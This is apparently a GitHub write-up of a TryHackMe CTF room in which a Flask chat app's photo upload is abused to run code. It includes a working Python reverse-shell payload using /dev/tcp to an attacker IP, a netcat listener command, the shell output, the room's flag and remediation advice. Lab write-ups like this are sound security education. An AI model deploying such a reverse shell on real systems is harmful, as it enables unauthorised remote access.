# 💘 Speed Chatting — TryHackMe Writeup

> **Room:** [Love at First Breach 2026 — Speed Chatting](https://tryhackme.com/room/lafb2026e4)
> **Difficulty:** Easy
> **Category:** Web Exploitation / Unrestricted File Upload → RCE
> **Status:** ✅ Completed — Flag Captured

---

## 📖 Overview

**Speed Chatting** is a TryHackMe room built around **LoveConnect – Speed Chatter**, a Flask-based
dating/chat web app. The box ships with a profile photo upload feature that fails to properly
validate uploaded files, allowing an attacker to upload and execute a malicious script and pop a
reverse shell on the host.

This repo contains my full writeup and a polished PDF report documenting the attack chain from
recon to flag capture.

---

## 🎯 Target Info

| Item | Value |
|---|---|
| Target IP | `10.145.180.35` |
| Target Port | `5000` (HTTP) |
| Attacker IP | `192.168.130.136` |
| Listener Port | `4444` |
| Tech Stack | Python / Flask |

---

## 🧩 Attack Chain

```
Recon (LoveConnect web app)
        │
        ▼
Unrestricted File Upload (Profile Photo)
        │
        ▼
Upload malicious Python reverse shell (shell.py)
        │
        ▼
Trigger execution → catch shell with netcat (robot@tryhackme-2204)
        │
        ▼
Enumerate host → privilege escalation
        │
        ▼
Read /opt/Speed_Chat/flag.txt
        │
        ▼
🏁 Flag: THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
```

---

## 🛠️ Tools Used

- Firefox / Chrome — interacting with the web app
- GNU `nano` — writing the payload
- `netcat` (`nc -lvnp`) — reverse shell listener
- Kali Linux AttackBox (TryHackMe-provided)

---

## ⚡ Steps to Reproduce

### 1. Recon
Browsed to `http://10.145.180.35:5000` and found the **LoveConnect** app with a
profile photo upload ("Update Photo") and a Speed Chat message box.

### 2. Craft the payload

```python
# shell.py
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.130.136/4444 0>&1'")
```

### 3. Start a listener

```bash
nc -lvnp 4444
```

### 4. Upload & bypass filter
Uploaded `shell.py` via the "Update Photo" feature, bypassing the upload filter
to get it stored server-side.

### 5. Trigger execution
Triggered the uploaded file so the Flask backend executed it, firing a reverse
shell back to the listener.

### 6. Catch the shell

```
connect to [192.168.130.136] from (UNKNOWN) [10.145.180.35] 46472
robot@tryhackme-2204:/opt/Speed_Chat#
```

### 7. Privilege escalation
Enumerated the host (`sudo -l`, SUID binaries, cron jobs, writable files) and
escalated access beyond the web app sandbox.

### 8. Capture the flag

```bash
root@tryhackme-2204:/opt/Speed_Chat# cat flag.txt
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
```

---

## 🔍 Vulnerability Summary

| ID | Finding | Severity | CWE |
|---|---|---|---|
| F-01 | Unrestricted File Upload (profile photo) | 🔴 Critical | CWE-434 |
| F-02 | Insufficient server-side file validation | 🟠 High | CWE-20 |
| F-03 | Excessive permissions for service account | 🟡 Medium | CWE-269 |

---

## 🧯 Remediation

- Validate uploads server-side via **content/magic-byte inspection**, not extension or `Content-Type`.
- Enforce a strict **allow-list** of image types (JPEG/PNG/WebP).
- Store uploads **outside the web root**, in a non-executable directory.
- Rename uploaded files to a generated, non-attacker-controlled filename.
- Run the web app under a least-privileged service account with no sudo rights.
- Serve the app over HTTPS and add outbound-connection monitoring to catch reverse shells.

---

<img width="1920" height="1080" alt="Screenshot_2026-10-13_14_28_14" src="https://github.com/user-attachments/assets/572e8aba-8df3-4d80-8378-1fbdd30b7437" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_14_28_20" src="https://github.com/user-attachments/assets/f37e1505-3432-4a6a-b7cc-0db703c5487d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_14_34_24" src="https://github.com/user-attachments/assets/30c44936-9391-40a5-a7a7-dd2db0be2991" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_14_41_54" src="https://github.com/user-attachments/assets/c1fb35ed-76f8-42b2-bb6f-be237479cc0d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_14_42_50" src="https://github.com/user-attachments/assets/5c521fe8-ac8b-4e60-91fc-205dfe70a103" />
---

## ⚠️ Disclaimer

This writeup documents activity performed **exclusively within an authorised TryHackMe
lab environment** for educational/CTF purposes. Do not use these techniques against
systems you do not own or have explicit written permission to test.

---

## 👤 Author

**Nishant Saini**
